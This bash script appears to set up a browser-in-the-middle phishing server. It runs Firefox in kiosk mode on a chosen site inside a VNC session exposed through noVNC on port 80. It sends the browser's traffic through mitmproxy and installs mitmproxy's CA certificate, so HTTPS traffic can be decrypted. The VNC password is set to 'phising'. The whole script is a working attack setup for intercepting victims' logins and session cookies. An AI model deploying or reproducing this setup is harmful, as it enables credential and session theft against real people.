#!/bin/bash

rm -rf ~/.vnc/*.pid ~/.vnc/*.log /tmp/.X1*
mkdir -p /root/.vnc/ ~/.mozilla/firefox/
touch /root/.Xauthority

cat << EOF > /tmp/user.js
user_pref("network.proxy.backup.ssl", "");
user_pref("network.proxy.backup.ssl_port", 0);
user_pref("network.proxy.http", "127.0.0.1");
user_pref("network.proxy.http_port", 8080);
user_pref("network.proxy.share_proxy_settings", true);
user_pref("network.proxy.ssl", "127.0.0.1");
user_pref("network.proxy.ssl_port", 8080);
user_pref("network.proxy.type", 1);
EOF

cat << EOF > /usr/lib/firefox-esr/distribution/policies.json
{
    "policies": {
        "Certificates": {
            "ImportEnterpriseRoots": true,
            "Install": [
                "mitmproxy.crt",
                "/usr/local/share/ca-certificates/mitmproxy.crt"
            ]
        }
    }
}
EOF

cat << EOF > /root/.vnc/xstartup
#!/bin/sh
unset SESSION_MANAGER
mitmweb --no-web-open-browser --web-host 10.0.0.200 &
rm -rf ~/.mozilla/
timeout 5 firefox-esr -headless
cp /tmp/user.js ~/.mozilla/firefox/*.default-esr/
curl --proxy http://10.0.0.200:8080 http://mitm.it/cert/pem -o /usr/local/share/ca-certificates/mitmproxy.crt
update-ca-certificates
firefox-esr --kiosk ${WEBSITE} &
exec openbox-session
EOF

chmod 755 /root/.vnc/xstartup
vncpasswd -f <<< phising > /root/.vnc/passwd
vncserver -PasswordFile /root/.vnc/passwd
/usr/share/novnc/utils/launch.sh --listen 80 --vnc 127.0.0.1:5901